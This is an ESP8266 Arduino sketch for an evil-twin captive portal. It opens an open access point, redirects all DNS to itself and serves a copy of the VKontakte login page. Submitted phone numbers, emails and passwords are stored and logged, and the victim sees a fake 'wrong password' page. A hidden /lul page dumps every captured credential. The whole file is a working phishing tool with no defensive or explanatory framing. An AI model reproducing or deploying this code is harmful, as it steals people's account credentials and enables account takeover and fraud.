#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>


const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
String login;
String password;
int counter = -1;
String logpass[100];

String responseHTML = 
R"====(
<!DOCTYPE html>
<html>
 <head>
    <style>
      *{
        margin:0;
        padding:0;
      }

      body{

        background-color: #edeef0;
        width: 100%;

      }

      a{
        text-decoration: none;
        font-family: 'Roboto', sans-serif;
      }

      header{
        position: static;

        height: 41px;
        width: 100%;
        background-color: #4a76a8;
        display: flex;
      }

      .logo img{
        margin-top: 9px;
        margin-left: 470px;
      }

      header p{
        font: 12pt/10pt bold;
        color: #fefefe;
        margin-top: 15px;
        margin-left: 8px;
      }

      header form{
        margin-left: 45px;
        margin-top: 7px;
      }

      .search input[type='text']{
        background-color: #224b7a;
        border: 0px solid black;
        width: 177px;
        height: 28px;
        border-radius: 15px;
        outline:none;
      }

      .search input[type='text']:focus{
        background-color: #ffffff;
        border: 0px solid black;
        width: 177px;
        height: 28px;
        border-radius: 15px;
      }

      .search input::-moz-placeholder{
        color: #8fadc8;
        margin-left: 28px;
      }

      .search input::-webkit-input-placeholder {
        color: #8fadc8;
        margin-left: 28px;
      }

      .search input{
          padding: 0 28px;
      }

      .magnifier{
        margin-top: 14px;
        margin-left: -226px;
      }

      .magnifier img{
        width: 17px;
        height: 17px;
      }

      main{
        width: 739px;
        height: 449px;
        background-color: #ffffff;
        margin-top: 50px;
        margin-left: 10%;
        border-radius: 5px;
        border: 1px solid #e2e3e7;
      }

      .enter p{
        color: #101111;
        margin-left: 295px;
        margin-top: 41px;
        font: 15pt/12pt bold;
        font-family: 'Roboto', sans-serif;
      }

      .condition{
        width: 677px;
        height: 55px;
        background-color: #f0f2f5;
        margin-top: 27px;
        margin-left: 31px;
        border:1px solid #ced5e1;
        border-radius: 2px;
      }

      .condition p{
        margin-top: 20px;
        margin-left: 17px;
        font: 10pt/8pt bold;
        font-family: 'Roboto', sans-serif;
      }

      .login input[type="text"]{
        width: 244px;
        height:34px;
        margin-left: 234px;
        margin-top: 30px;
        background-color: #ffffff;
        border: 1px solid #e0e5e8;
        border-radius: 3px;
        outline:none;
      }

      .login input{
          padding: 0 12px;
      }

      .password input[type="password"]{
        width: 244px;
        height:34px;
        margin-left: 234px;
        margin-top: 14px;
        background-color: #ffffff;
        border: 1px solid #e0e5e8;
        border-radius: 3px;
        outline:none;
      }

      .password input{
          padding: 0 12px;
      }

      .checkbox input[type="checkbox"]{
        margin-top: 8px;
        margin-left: 215px;
        opacity: 0;

      }

      .checkbox{
        display: flex; 
      }

      .checkbox label{
        margin-left: 7px;
        margin-top: 17px;
        font: 10pt/8pt bold;
        font-family: 'Roboto', sans-serif;
      }

      .checkbox input+label {
        display: inline-flex;
        align-items: center;
        user-select: none;
      }
      .checkbox input+label::before {
        content: '';
        display: inline-block;
        width: 13px;
        height: 13px;
        flex-shrink: 0;
        flex-grow: 0;
        border: 1px solid #d4dadf;
        border-radius: 0.25em;
        margin-right: 0.5em;
        background-repeat: no-repeat;
        background-position: center center;
        background-size: 50% 50%;
      }

      .checkbox input:checked+label::before {
        border-color: #5181b8;
        background-color: #5181b8;
        background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'%3e%3cpath fill='%23fff' d='M6.564.75l-3.59 3.612-1.538-1.55L0 4.26 2.974 7.25 8 2.193z'/%3e%3c/svg%3e");
      }

      .go input{
        width: 106px;
        height: 35px;
        margin-left: 235px;
        margin-top: 20px;
        background-color: #5181b8;
        color: #fffff6;
        border: 0px solid;
        border-radius: 2px;
      }

      .go input:hover{
        background-color: #5b88bd;
        cursor: pointer;
      }

      .register{
        margin-left: 350px;
        margin-top: -35px;
      }

      .register input{
        width: 156px;
        height: 35px;
        background-color: #5fb053;
        color: #fffff6;
        border: 0px solid;
        border-radius: 2px;
      }

      .register input:hover{
        background-color: #68b35d;
        cursor: pointer;
      }

      .forgot a{
        float: left;
        margin-left: 235px;
        padding-top: 40px;
        color: #275389;
        font: 13px/8px solid;
        font-family: 'Roboto', sans-serif;
      }

      .line{
        margin-left: 471px;
        margin-top: 88px;
      }

      .more{
        display: flex;
      }

      .more a{
        color: #396595;
        position: relative;
        top: 10px;
        font: 13px/11px solid;
        font-family: 'Roboto', sans-serif;
      }

      .more a:hover{
        text-decoration: underline;
      }

      .vk{
        margin-left: 10%;
      }

      .more p{
        margin-left: 67px;
        margin-top: -3px;
        font: 14px/12px solid;
        color: #909a9b;
        font-family: 'Roboto', sans-serif;
      }

      .more2{
        display: flex;
        flex-wrap: wrap;
        justify-content: space-around;
        margin-left: 99px;
      }

      .info{
        margin-left: 13px;
      }

      .more3{
        margin-left: 104px;
        display: flex;
        flex-wrap: wrap;
        justify-content: space-around;
      }

      .languages{
        margin-left: 10px;
      }
    </style>
    <meta charset="utf-8">
    <title>Вход | Вконтакте</title>
    <link rel="stylesheet" type="text/css" href="style.css">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet">
    <link rel="icon" type="image/png" href="images/fav_logo.png">
  </head>
  <body>
    <header>
      <div class="logo">
        <a href="#"><img src="images/logo.png"></a>
      </div>
      <div class="home">
      </div>

      <div>
        <form action="" method="POST" class="search">
          <div class="search">
            <input type="text" name="name" id="name" placeholder="Поиск">
          </div>
        </form>
      </div>

      <div class="magnifier">
        <img src="images/search1.png">
      </div>
    </header>

    <main>
      <div class="enter">
        <p>Вход ВКонтакте</p>
      </div>

      <div class="condition">
        <p>Чтобы просматривать эту страницу, нужно зайти на сайт.</p>
      </div>

      <div class="checkin">
        <form action="/InvalidLoginPassword" method="POST">
          <div class="login">
            <input type="text" name="login" placeholder="Телефон или email">
          </div>
          <div class="password">
            <input type="password" name="password" placeholder="Пароль">
          </div>
          <div class="checkbox">
            <input type="checkbox" name="name" id="checkbox">
            <label for="checkbox">Чужой компьютер</label>
          </div>
          <div class="go">
            <input type="submit" name="send" value="Войти">
          </div>
        </form>
        <div class="register">
          <a href="https://vk.com/join"><input type="submit" name="register" value="Регистрация"></a>
        </div>
        <div class="forgot">
          <a class="forgota" href="https://vk.com/restore">Забыли пароль или не можете войти?</a>
        </div>
      </div>
    </main>

    <footer>
      <div class="line">
        <img src="images/line.png">
      </div>
      <div class="more">
        <div class="vk"><a href="https://vk.com/about">ВКонтакте</a> <p>2006-2020</p></div>

        <div class="more2">
          <div class=""><a href="https://vk.com/about">О ВКонтакте</a></div>
          <div class="info"><a href="https://vk.com/terms">Правила</a></div>
          <div class="info"><a href="https://vk.com/ads">Для бизнеса</a></div>
          <div class="info"><a href="https://vk.com/dev">Разработчикам</a></div>
        </div>

        <div class="more3">
          <div class=""><a href="#">Русский</a></div>
          <div class="languages"><a href="#">Українська</a></div>
          <div class="languages"><a href="#">English</a></div>
          <div class="languages"><a href="#">все языки </a></div>
        </div>  
      </div>
    </footer>
  </body>
</html>
)====";

void handleForm() {
   counter++;
   login = webServer.arg("login"); 
   password = webServer.arg("password");
   logpass[counter] = login+" "+password;
  
   Serial.print("First Name:");
   Serial.println(login);
  
   Serial.print("Last Name:");
   Serial.println(password);
   
   String s =
   R"====(
   <!DOCTYPE html>
    <html>
     <head>
        <style>
          *{
            margin:0;
            padding:0;
          }
    
          body{
    
            background-color: #edeef0;
            width: 100%;
    
          }
    
          a{
            text-decoration: none;
            font-family: 'Roboto', sans-serif;
          }
    
          header{
            position: static;
    
            height: 41px;
            background-color: #4a76a8;
            display: flex;
            width: 100%;
          }
    
          .logo img{
            margin-top: 9px;
            margin-left: 470px;
          }
    
          header p{
            font: 12pt/10pt bold;
            color: #fefefe;
            margin-top: 15px;
            margin-left: 8px;
          }
    
          header form{
            margin-left: 45px;
            margin-top: 7px;
          }
    
          .search input[type='text']{
            background-color: #224b7a;
            border: 0px solid black;
            width: 177px;
            height: 28px;
            border-radius: 15px;
            outline:none;
          }
    
          .search input[type='text']:focus{
            background-color: #ffffff;
            border: 0px solid black;
            width: 177px;
            height: 28px;
            border-radius: 15px;
          }
    
          .search input::-moz-placeholder{
            color: #8fadc8;
            margin-left: 28px;
          }
    
          .search input::-webkit-input-placeholder {
            color: #8fadc8;
            margin-left: 28px;
          }
    
          .search input{
              padding: 0 28px;
          }
    
          .magnifier{
            margin-top: 14px;
            margin-left: -226px;
          }
    
          .magnifier img{
            width: 17px;
            height: 17px;
          }
    
          main{
            width: 739px;
            height: 473px;
            background-color: #ffffff;
            margin-top: 50px;
            margin-left: 10%;
            border-radius: 5px;
            border: 1px solid #e2e3e7;
          }
    
          .enter p{
            color: #101111;
            margin-left: 295px;
            margin-top: 41px;
            font: 15pt/12pt bold;
            font-family: 'Roboto', sans-serif;
          }
    
          .condition{
            width: 677px;
            height: 55px;
            background-color: #f0f2f5;
            margin-top: 27px;
            margin-left: 31px;
            border:1px solid #ced5e1;
            border-radius: 2px;
          }
    
          .condition p{
            margin-top: 20px;
            margin-left: 17px;
            font: 10pt/8pt bold;
            font-family: 'Roboto', sans-serif;
          }
    
          .login input[type="text"]{
            width: 244px;
            height:34px;
            margin-left: 234px;
            margin-top: 30px;
            background-color: #ffffff;
            border: 1px solid #e0e5e8;
            border-radius: 3px;
            outline:none;
          }
    
          .login input{
              padding: 0 12px;
          }
    
          .password input[type="password"]{
            width: 244px;
            height:34px;
            margin-left: 234px;
            margin-top: 14px;
            background-color: #ffffff;
            border: 1px solid #e0e5e8;
            border-radius: 3px;
            outline:none;
          }
    
          .password input{
              padding: 0 12px;
          }
    
          .checkbox input[type="checkbox"]{
            margin-top: 8px;
            margin-left: 215px;
            opacity: 0;
    
          }
    
          .checkbox{
            display: flex; 
          }
    
          .checkbox label{
            margin-left: 7px;
            margin-top: 17px;
            font: 10pt/8pt bold;
            font-family: 'Roboto', sans-serif;
          }
    
          .checkbox input+label {
            display: inline-flex;
            align-items: center;
            user-select: none;
          }
          .checkbox input+label::before {
            content: '';
            display: inline-block;
            width: 13px;
            height: 13px;
            flex-shrink: 0;
            flex-grow: 0;
            border: 1px solid #d4dadf;
            border-radius: 0.25em;
            margin-right: 0.5em;
            background-repeat: no-repeat;
            background-position: center center;
            background-size: 50% 50%;
          }
    
          .checkbox input:checked+label::before {
            border-color: #5181b8;
            background-color: #5181b8;
            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'%3e%3cpath fill='%23fff' d='M6.564.75l-3.59 3.612-1.538-1.55L0 4.26 2.974 7.25 8 2.193z'/%3e%3c/svg%3e");
          }
    
          .go input{
            width: 106px;
            height: 35px;
            margin-left: 235px;
            margin-top: 20px;
            background-color: #5181b8;
            color: #fffff6;
            border: 0px solid;
            border-radius: 2px;
          }
    
          .go input:hover{
            background-color: #5b88bd;
            cursor: pointer;
          }
    
          .register{
            margin-left: 350px;
            margin-top: -35px;
          }
    
          .register input{
            width: 156px;
            height: 35px;
            background-color: #5fb053;
            color: #fffff6;
            border: 0px solid;
            border-radius: 2px;
          }
    
          .register input:hover{
            background-color: #68b35d;
            cursor: pointer;
          }
    
          .forgot a{
            float: left;
            margin-left: 235px;
            padding-top: 40px;
            color: #275389;
            font: 13px/8px solid;
            font-family: 'Roboto', sans-serif;
          }
    
          .line{
            margin-left: 471px;
            margin-top: 88px;
          }
    
          .more{
            display: flex;
          }
    
          .more a{
            color: #396595;
            position: relative;
            top: 10px;
            font: 13px/11px solid;
            font-family: 'Roboto', sans-serif;
          }
    
          .more a:hover{
            text-decoration: underline;
          }
    
          .vk{
            margin-left: 10%;
          }
    
          .more p{
            margin-left: 67px;
            margin-top: -3px;
            font: 14px/12px solid;
            color: #909a9b;
            font-family: 'Roboto', sans-serif;
          }
    
          .more2{
            display: flex;
            flex-wrap: wrap;
            justify-content: space-around;
            margin-left: 99px;
          }
    
          .info{
            margin-left: 13px;
          }
    
          .more3{
            margin-left: 104px;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-around;
          }
    
          .languages{
            margin-left: 10px;
          }
    
          .invalid{
            font-family: 'Roboto', sans-serif;
            font: 11pt/8pt bold;
            color: #b93939;
            text-align: center;
            margin-top: 10px;
            margin-left: 31px;
            background-color: #faebeb;
            width: 677px;
            padding: 10px;
            line-height: 15px;
          }
        </style>
        <meta charset="utf-8">
        <title>Вход | Вконтакте</title>
        <!--<link rel="stylesheet" type="text/css" href="style.css"> -->
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet">
        <link rel="icon" type="image/png" href="images/fav_logo.png">
      </head>
      <body>
        <header>
          <div class="logo">
            <a href="#"><img src="images/logo.png"></a>
          </div>
          <div class="home">
            <p>           </p>
          </div>
    
          <div>
            <form action="obrabotka.php" method="post" class="search">
              <div class="search">
                <input type="text" name="name" id="name" placeholder="Поиск">
              </div>
            </form>
          </div>
    
          <div class="magnifier">
            <img src="images/search1.png">
          </div>
        </header>
    
        <main>
          <div class="enter">
            <p>Вход ВКонтакте</p>
          </div>
    
          <div class="condition">
            <p>Чтобы просматривать эту страницу, нужно зайти на сайт.</p>
          </div>
    
          <div class="checkin">
            <form action="InvalidLoginPassword" method="POST">
              <div class="login">
                <input type="text" name="login" placeholder="Телефон или email">
              </div>
              <div class="password">
                <input type="password" name="password" placeholder="Пароль">
              </div>
              <div class="checkbox">
                <input type="checkbox" name="name" id="checkbox">
                <label for="checkbox">Чужой компьютер</label>
              </div>
              <div class="go">
                <input type="submit" name="send" value="Войти">
              </div>
            </form>
            <div class="register">
              <a href="https://vk.com/join"><input type="submit" name="register" value="Регистрация"></a>
            </div>
            <div class="invalid">
              <p>Не удаётся войти.<br>Пожалуйста, проверьте правильность написания логина и пароля.</p>
            </div>
            <div class="forgot">
              <a class="forgota" href="https://vk.com/restore">Забыли пароль или не можете войти?</a>
            </div>
          </div>
        </main>
    
        <footer>
          <div class="line">
            <img src="images/line.png">
          </div>
          <div class="more">
            <div class="vk"><a href="https://vk.com/about">ВКонтакте</a> <p>© 2006–2020</p></div>
    
            <div class="more2">
              <div class=""><a href="https://vk.com/about">О ВКонтакте</a></div>
              <div class="info"><a href="https://vk.com/terms">Правила</a></div>
              <div class="info"><a href="https://vk.com/ads">Для бизнеса</a></div>
              <div class="info"><a href="https://vk.com/dev">Разработчикам</a></div>
            </div>
    
            <div class="more3">
              <div class=""><a href="#">Русский</a></div>
              <div class="languages"><a href="#">Українська</a></div>
              <div class="languages"><a href="#">English</a></div>
              <div class="languages"><a href="#">все языки »</a></div>
            </div>  
          </div>
        </footer>
      </body>
    </html>
   )====";
   
   webServer.send(200, "text/html", s); //Send web page
}

void lul(){
  //String s = login + password;
  //String s = logpass[counter];
  String s = " ";
  for(int i = 0; i <= counter; i++){
    s = s+" "+logpass[i]+" | ";
  }
  webServer.send(200, "text/html", s); //Send web page
}
                      

void setup() {
  Serial.begin(9600);
  pinMode(LED_BUILTIN, OUTPUT);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("wifi");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/InvalidLoginPassword", handleForm);

  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });

  webServer.on("/lul", lul);
  
  webServer.begin();
}

void loop() {
  digitalWrite(LED_BUILTIN, LOW);
  dnsServer.processNextRequest();
  webServer.handleClient();
}
